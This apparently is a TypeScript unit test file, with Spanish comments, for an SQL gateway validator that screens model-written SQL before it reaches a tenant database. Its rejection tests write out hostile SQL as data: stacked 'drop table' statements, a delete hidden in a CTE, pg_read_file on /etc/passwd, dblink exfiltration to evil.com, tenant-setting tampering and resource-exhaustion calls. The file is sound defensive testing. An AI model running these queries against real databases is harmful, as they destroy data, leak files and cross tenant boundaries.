/**
 * SQO-01: unit tests del validador AST del SQL Gateway (AI-03). Es la pieza
 * de mayor riesgo del proyecto (unica barrera entre "un modelo escribe SQL en
 * lenguaje natural" y "esa SQL toca la base de datos real"), y hasta ahora
 * solo se habia verificado a mano. Pura logica sincrona, sin I/O: rapido y
 * determinista, no necesita Supabase ni red.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { validateGatewaySql } from "./sql-gateway.js";

function assertAccepted(sql: string, expectedTables?: string[]) {
  const result = validateGatewaySql(sql);
  assert.equal(result.ok, true, `deberia aceptarse: ${sql}\nmotivo: ${result.ok ? "" : result.reason}`);
  if (result.ok && expectedTables) {
    assert.deepEqual([...result.tables].sort(), [...expectedTables].sort());
  }
}

function assertRejected(sql: string, reasonIncludes?: string) {
  const result = validateGatewaySql(sql);
  assert.equal(result.ok, false, `deberia rechazarse: ${sql}`);
  if (!result.ok && reasonIncludes) {
    assert.ok(
      result.reason.includes(reasonIncludes),
      `motivo esperado que incluyera "${reasonIncludes}", fue: "${result.reason}"`,
    );
  }
}

// --- Consultas legitimas ---------------------------------------------------

test("acepta un SELECT simple sobre una tabla permitida", () => {
  assertAccepted("select id, net_sales from shopify_order_facts", ["shopify_order_facts"]);
});

test("acepta un SELECT con join entre dos tablas permitidas", () => {
  assertAccepted(
    "select o.id, i.title from shopify_order_facts o join shopify_order_items i on i.order_id = o.id",
    ["shopify_order_facts", "shopify_order_items"],
  );
});

test("acepta agregaciones con group by", () => {
  assertAccepted(
    "select store_id, sum(net_sales) as total from shopify_order_facts group by store_id",
    ["shopify_order_facts"],
  );
});

test("acepta un WITH (CTE) que referencia una tabla permitida", () => {
  assertAccepted(
    "with recientes as (select id, net_sales from shopify_order_facts where processed_at > now() - interval '30 days') select * from recientes",
    ["shopify_order_facts"],
  );
});

test("acepta UNION de dos selects sobre tablas permitidas", () => {
  assertAccepted(
    "select id from tasks union select id from alerts",
    ["tasks", "alerts"],
  );
});

test("acepta funciones de agregacion normales (count, avg)", () => {
  assertAccepted("select count(*), avg(net_sales) from shopify_order_facts");
});

// --- Sentencias prohibidas (cualquier posicion, incluso dentro de un CTE) --

// INSERT/UPDATE/DELETE/DDL no son ni siquiera un tipo de sentencia permitido
// a nivel superior (TOP_LEVEL_ALLOWED_TYPES), asi que se rechazan antes de
// llegar al escaneo de tipos prohibidos: "rechaza una escritura escondida
// dentro de un CTE" (mas abajo) es el que ejercita ese segundo escalon.

test("rechaza INSERT", () => {
  assertRejected("insert into tasks (title) values ('x')", "sentencia_no_permitida");
});

test("rechaza UPDATE", () => {
  assertRejected("update tasks set status = 'completed'", "sentencia_no_permitida");
});

test("rechaza DELETE", () => {
  assertRejected("delete from tasks", "sentencia_no_permitida");
});

test("rechaza DROP TABLE", () => {
  assertRejected("drop table tasks", "sentencia_no_permitida");
});

test("rechaza TRUNCATE", () => {
  assertRejected("truncate table tasks", "sentencia_no_permitida");
});

test("rechaza ALTER TABLE", () => {
  assertRejected("alter table tasks add column x text", "sentencia_no_permitida");
});

test("rechaza CREATE TABLE", () => {
  assertRejected("create table evil (id int)", "sentencia_no_permitida");
});

test("rechaza GRANT/REVOKE", () => {
  // El parser ni siquiera reconoce la gramatica de GRANT/REVOKE: se rechaza
  // como sql_no_parseable, un escalon antes de necesitar la allowlist.
  assertRejected("grant select on tasks to public");
  assertRejected("revoke select on tasks from public");
});

test("rechaza una escritura escondida dentro de un CTE", () => {
  assertRejected(
    "with x as (delete from tasks returning id) select * from x",
    "operacion_prohibida",
  );
});

test("rechaza apilar sentencias con punto y coma (SELECT ; DROP)", () => {
  assertRejected("select 1; drop table tasks;", "solo_se_permite_una_sentencia");
});

// AI-03: WITH RECURSIVE estaba explicitamente permitido -- un CTE recursivo
// mal formado agota el statement_timeout de 8s en vez de fallar rapido. Los
// agentes no necesitan recursion para consultas analiticas sobre `ai.*`.
test("rechaza WITH RECURSIVE top-level", () => {
  assertRejected(
    "with recursive t(n) as (select 1 union all select n+1 from t where n<5) select * from t",
    "sentencia_no_permitida: with recursive",
  );
});

test("rechaza WITH RECURSIVE anidado dentro de una subquery", () => {
  assertRejected(
    "select * from (with recursive t(n) as (select 1 union all select n+1 from t where n<5) select * from t) sub",
    "operacion_prohibida: with recursive",
  );
});

// --- Tablas fuera de la allowlist (aislamiento de tenant / superficie) ----

test("rechaza una tabla que no esta en la allowlist del esquema ai", () => {
  assertRejected("select * from organizations", "tabla_fuera_de_allowlist");
});

test("rechaza acceso a tablas de identidad/roles aunque existan en public", () => {
  assertRejected("select * from profiles", "tabla_fuera_de_allowlist");
  assertRejected("select * from organization_members", "tabla_fuera_de_allowlist");
  assertRejected("select * from consultant_assignments", "tabla_fuera_de_allowlist");
});

test("rechaza un esquema cualificado distinto de ai (fuga cross-schema)", () => {
  assertRejected("select * from public.organizations", "esquema_no_permitido");
  assertRejected("select * from auth.users", "esquema_no_permitido");
});

test("permite el esquema ai explicito sobre una tabla de la allowlist", () => {
  assertAccepted("select * from ai.tasks");
});

// --- Funciones peligrosas ---------------------------------------------------

test("rechaza pg_sleep y otras funciones con prefijo pg_", () => {
  assertRejected("select pg_sleep(10)", "funcion_prohibida");
  assertRejected("select * from tasks where pg_read_file('/etc/passwd') is not null", "funcion_prohibida");
});

test("rechaza set_config / current_setting (fuga del GUC de tenant)", () => {
  assertRejected("select set_config('app.gateway_org_id', 'x', true)", "funcion_prohibida");
  assertRejected("select current_setting('app.gateway_org_id')", "funcion_prohibida");
});

test("rechaza dblink (exfiltracion de datos)", () => {
  assertRejected("select dblink('host=evil.com', 'select 1')", "funcion_prohibida");
});

test("rechaza generate_series, regexp_split_to_table y jsonb_path_query (abuso de recursos, SQO-04 fila 7)", () => {
  assertRejected("select * from generate_series(1, 10000000000)", "funcion_prohibida");
  assertRejected("select count(*) from tasks, generate_series(1, 1000000) g", "funcion_prohibida");
  assertRejected("select regexp_split_to_table(title, ' ') from tasks", "funcion_prohibida");
  assertRejected("select jsonb_path_query(context_data, '$.**') from alerts", "funcion_prohibida");
});

test("rechaza una funcion llamada con esquema cualificado", () => {
  assertRejected("select pg_catalog.pg_sleep(1)", "funcion_cualificada_no_permitida");
});

// --- Casos limite ------------------------------------------------------------

test("rechaza una consulta vacia", () => {
  assertRejected("", "consulta_vacia");
  assertRejected("   ", "consulta_vacia");
});

test("rechaza SQL no parseable", () => {
  assertRejected("select from where", "sql_no_parseable");
});

test("rechaza sentencias top-level no select (SHOW, COPY, SET)", () => {
  assertRejected("show search_path", "sentencia_no_permitida");
  assertRejected("set search_path to public", "sentencia_no_permitida");
});

test("un nombre de tabla dentro de un CTE que coincide con el alias del CTE no cuela una tabla prohibida", () => {
  // El CTE se llama "organizations" pero su cuerpo lee de una tabla prohibida:
  // debe rechazarse por la tabla real referenciada dentro del CTE.
  assertRejected(
    "with organizations as (select id from public.organizations) select * from organizations",
    "esquema_no_permitido",
  );
});
